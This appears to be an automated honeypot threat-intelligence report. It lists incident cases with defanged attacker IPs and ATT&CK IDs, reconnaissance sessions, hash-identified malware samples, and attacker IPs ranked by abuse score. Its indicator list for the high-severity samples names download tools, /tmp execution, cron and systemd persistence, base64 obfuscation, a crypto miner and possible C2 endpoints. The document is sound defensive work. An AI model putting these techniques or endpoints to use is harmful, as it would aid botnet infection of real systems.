| IR-14cb3ef8dd1a | HIGH | `193.32.162[.]84` | 2026-11-26 10:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4332d3761db6 | HIGH | `66.228.53[.]162` | 2026-11-26 10:41 | Y | 3 | 0 | `T1078` |
| IR-cea995383e3d | HIGH | `193.32.162[.]84` | 2026-11-26 10:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-759b37f16714 | HIGH | `193.32.162[.]84` | 2026-11-26 10:43 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-51d03af0ba3c | HIGH | `193.32.162[.]84` | 2026-11-26 10:45 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-85c26402c996 | HIGH | `193.32.162[.]84` | 2026-11-26 10:47 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-837c88593070 | HIGH | `193.32.162[.]84` | 2026-11-26 10:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6bf9d2af35a5 | HIGH | `176.53.159[.]196` | 2026-11-26 10:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-857afe616054 | HIGH | `193.32.162[.]84` | 2026-11-26 10:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6face01c9b6c | HIGH | `193.32.162[.]84` | 2026-11-26 10:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0f384a622e65 | HIGH | `193.32.162[.]84` | 2026-11-26 10:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-da8a0b1f7fdb | HIGH | `193.32.162[.]84` | 2026-11-26 10:58 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3528bf41b75d | HIGH | `193.32.162[.]84` | 2026-11-26 11:00 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9eeb999c061f | HIGH | `193.32.162[.]84` | 2026-11-26 11:04 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-54abffb9c56c | HIGH | `193.32.162[.]84` | 2026-11-26 11:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9f5acc4933ab | HIGH | `193.32.162[.]84` | 2026-11-26 11:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-be213f7bf348 | HIGH | `193.32.162[.]84` | 2026-11-26 11:10 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e8d5b61fe701 | HIGH | `193.32.162[.]84` | 2026-11-26 11:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5d91f4991f4 | HIGH | `193.32.162[.]84` | 2026-11-26 11:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-be97e4a9b1e9 | HIGH | `193.32.162[.]84` | 2026-11-26 11:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-abe38ee0472b | HIGH | `193.32.162[.]84` | 2026-11-26 11:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-de4507a8aecf | HIGH | `193.32.162[.]84` | 2026-11-26 11:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-70bb21f5db93 | HIGH | `138.226.239[.]233` | 2026-11-26 11:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1bb1f9d41d78 | HIGH | `193.32.162[.]84` | 2026-11-26 11:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 113 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `163.52.135[.]28` | **4** | 2026-11-26 10:30 | 2026-11-26 16:22 | 6m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **3** | 2026-11-26 05:05 | 2026-11-26 08:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]120` | **2** | 2026-11-26 17:09 | 2026-11-26 18:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]130` | **2** | 2026-11-26 09:51 | 2026-11-26 11:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]134` | **2** | 2026-11-26 16:25 | 2026-11-26 18:03 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]46` | **2** | 2026-11-26 13:01 | 2026-11-26 14:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]228` | **2** | 2026-11-26 15:51 | 2026-11-26 16:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `198.179.70[.]19` | **2** | 2026-11-26 09:09 | 2026-11-26 11:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `31.220.0[.]26` | **2** | 2026-11-26 13:31 | 2026-11-26 15:22 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.227.203[.]162` | 1 | 2026-11-26 05:40 | 2026-11-26 05:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-11-26 07:36 | 2026-11-26 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.33[.]69` | 1 | 2026-11-26 13:42 | 2026-11-26 13:42 | 7s | 0 | `T1592` | 🟢 LOW |
| `121.154.9[.]109` | 1 | 2026-11-26 18:44 | 2026-11-26 18:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-26 10:12 | 2026-11-26 10:13 | 42s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-26 14:49 | 2026-11-26 14:50 | 49s | 0 | `T1592` | 🟢 LOW |
| `142.198.62[.]170` | 1 | 2026-11-26 06:28 | 2026-11-26 06:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `157.230.35[.]175` | 1 | 2026-11-26 05:34 | 2026-11-26 05:34 | 9s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-26 08:36 | 2026-11-26 08:36 | 21s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-26 13:29 | 2026-11-26 13:29 | 41s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-26 17:05 | 2026-11-26 17:06 | 45s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-26 11:27 | 2026-11-26 11:27 | 36s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-26 15:47 | 2026-11-26 15:48 | 45s | 0 | `T1592` | 🟢 LOW |
| `167.71.133[.]68` | 1 | 2026-11-26 17:05 | 2026-11-26 17:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-11-26 17:40 | 2026-11-26 17:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-26 17:41 | 2026-11-26 17:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]51` | 1 | 2026-11-26 18:53 | 2026-11-26 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.75.235[.]46` | 1 | 2026-11-26 10:21 | 2026-11-26 10:21 | 7s | 0 | `T1592` | 🟢 LOW |
| `177.75.235[.]46` | 1 | 2026-11-26 13:04 | 2026-11-26 13:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `179.43.158[.]121` | 1 | 2026-11-26 15:31 | 2026-11-26 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-26 08:55 | 2026-11-26 08:55 | 9s | 0 | `T1592` | 🟢 LOW |
| `181.78.15[.]133` | 1 | 2026-11-26 14:34 | 2026-11-26 14:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `183.238.41[.]121` | 1 | 2026-11-26 08:54 | 2026-11-26 08:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.169.100[.]25` | 1 | 2026-11-26 06:25 | 2026-11-26 06:26 | 52s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]52` | 1 | 2026-11-26 09:51 | 2026-11-26 09:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-11-26 17:41 | 2026-11-26 17:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]120` | 1 | 2026-11-26 11:40 | 2026-11-26 11:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `185.48.57[.]248` | 1 | 2026-11-26 07:45 | 2026-11-26 07:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.72.12[.]37` | 1 | 2026-11-26 17:47 | 2026-11-26 17:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `191.217.250[.]87` | 1 | 2026-11-26 16:11 | 2026-11-26 16:12 | 4s | 0 | `T1592` | 🟢 LOW |
| `191.217.250[.]87` | 1 | 2026-11-26 18:16 | 2026-11-26 18:16 | 4s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-26 10:13 | 2026-11-26 10:13 | 12s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-26 13:06 | 2026-11-26 13:06 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.32.204[.]152` | 1 | 2026-11-26 06:13 | 2026-11-26 06:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-11-26 18:38 | 2026-11-26 18:38 | 9s | 0 | `T1592` | 🟢 LOW |
| `195.91.217[.]34` | 1 | 2026-11-26 07:53 | 2026-11-26 07:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.117.69[.]174` | 1 | 2026-11-26 07:47 | 2026-11-26 07:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.2.110[.]105` | 1 | 2026-11-26 14:09 | 2026-11-26 14:10 | 22s | 0 | `T1592` | 🟢 LOW |
| `198.2.110[.]105` | 1 | 2026-11-26 16:52 | 2026-11-26 16:52 | 26s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-26 15:01 | 2026-11-26 15:01 | 11s | 0 | `T1592` | 🟢 LOW |
| `20.118.27[.]151` | 1 | 2026-11-26 09:59 | 2026-11-26 09:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]30` | 1 | 2026-11-26 15:39 | 2026-11-26 15:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `220.134.100[.]207` | 1 | 2026-11-26 16:28 | 2026-11-26 16:28 | 11s | 0 | `T1592` | 🟢 LOW |
| `220.70.165[.]38` | 1 | 2026-11-26 09:52 | 2026-11-26 09:53 | 24s | 0 | `T1592` | 🟢 LOW |
| `222.103.201[.]40` | 1 | 2026-11-26 06:04 | 2026-11-26 06:05 | 22s | 0 | `T1592` | 🟢 LOW |
| `222.97.112[.]179` | 1 | 2026-11-26 18:12 | 2026-11-26 18:12 | 31s | 0 | `T1592` | 🟢 LOW |
| `24.6.116[.]202` | 1 | 2026-11-26 11:52 | 2026-11-26 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.220.0[.]26` | 1 | 2026-11-26 18:07 | 2026-11-26 18:08 | 56s | 0 | `T1592` | 🟢 LOW |
| `35.206.150[.]95` | 1 | 2026-11-26 04:56 | 2026-11-26 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.220[.]9` | 1 | 2026-11-26 09:43 | 2026-11-26 09:43 | 2s | 0 | `T1592` | 🟢 LOW |
| `40.80.203[.]118` | 1 | 2026-11-26 05:00 | 2026-11-26 05:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.80.204[.]80` | 1 | 2026-11-26 13:00 | 2026-11-26 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `44.201.129[.]116` | 1 | 2026-11-26 12:21 | 2026-11-26 12:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-26 16:32 | 2026-11-26 16:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-26 07:42 | 2026-11-26 07:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-26 11:40 | 2026-11-26 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.29.26[.]133` | 1 | 2026-11-26 11:06 | 2026-11-26 11:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.35.178[.]45` | 1 | 2026-11-26 07:15 | 2026-11-26 07:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-26 10:11 | 2026-11-26 10:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-11-26 06:17 | 2026-11-26 06:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-26 09:04 | 2026-11-26 09:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]52` | 1 | 2026-11-26 09:37 | 2026-11-26 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]221` | 1 | 2026-11-26 07:58 | 2026-11-26 07:58 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]194` | 1 | 2026-11-26 16:31 | 2026-11-26 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]162` | 1 | 2026-11-26 10:41 | 2026-11-26 10:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]46` | 1 | 2026-11-26 06:45 | 2026-11-26 06:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-26 18:53 | 2026-11-26 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.167[.]142` | 1 | 2026-11-26 17:11 | 2026-11-26 17:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-26 07:29 | 2026-11-26 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-26 11:52 | 2026-11-26 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]161` | 1 | 2026-11-26 09:11 | 2026-11-26 09:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-26 08:06 | 2026-11-26 08:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-26 07:02 | 2026-11-26 07:02 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-26 11:24 | 2026-11-26 11:24 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-26 15:45 | 2026-11-26 15:45 | 6s | 0 | `T1592` | 🟢 LOW |
| `82.147.85[.]98` | 1 | 2026-11-26 06:56 | 2026-11-26 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.72[.]28` | 1 | 2026-11-26 09:49 | 2026-11-26 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.90.229[.]236` | 1 | 2026-11-26 16:40 | 2026-11-26 16:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-11-26 07:19 | 2026-11-26 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.188.91[.]101` | 1 | 2026-11-26 17:24 | 2026-11-26 17:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.45.99[.]12` | 1 | 2026-11-26 17:19 | 2026-11-26 17:19 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.57.122[.]209` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `217.60.242[.]22` | NL | Cat Communication Networks LTD | **100** ⚠️ | 4 |
| `95.188.91[.]101` | RU | OJSC Rostelecom | **100** ⚠️ | 50 |
| `103.143.239[.]254` | US | HONG KONG LING JIAN ZHUO TECHNOLOGY CO., LIMITED | **100** ⚠️ | 2 |
| `170.231.237[.]214` | CH | GRUPO PANAGLOBAL 15 S.A | **100** ⚠️ | 50 |
